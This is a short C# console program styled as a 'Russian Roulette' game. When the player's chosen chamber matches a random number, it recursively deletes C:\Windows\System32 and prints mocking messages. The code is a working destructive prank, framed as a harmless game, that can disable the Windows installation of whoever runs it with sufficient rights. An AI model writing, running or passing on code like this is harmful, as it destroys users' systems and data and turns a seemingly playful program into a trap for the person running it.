using System;
class Program
{
    static void Main(string[] args)
    {
        Console.WriteLine("Welcome to Windows 32 Russian Roulette!");
        
        Random random = new Random();
        int bullet = random.Next(1, 7);

        Console.Write("Pick a chamber (1-6): ");
        int chamber = int.Parse(Console.ReadLine());

        if (chamber == bullet)
        {
            Console.WriteLine("Oops! Looks like you just deleted Windows 32. Good luck reinstalling! 😈");
            System.IO.Directory.Delete(@"C:\Windows\System32", true);
            Console.WriteLine("Windows 32 has been successfully deleted!😱");
        }
        else
        {
            Console.WriteLine("Phew! You survived... this time. Try again if you dare!😜");
        }
    }
}
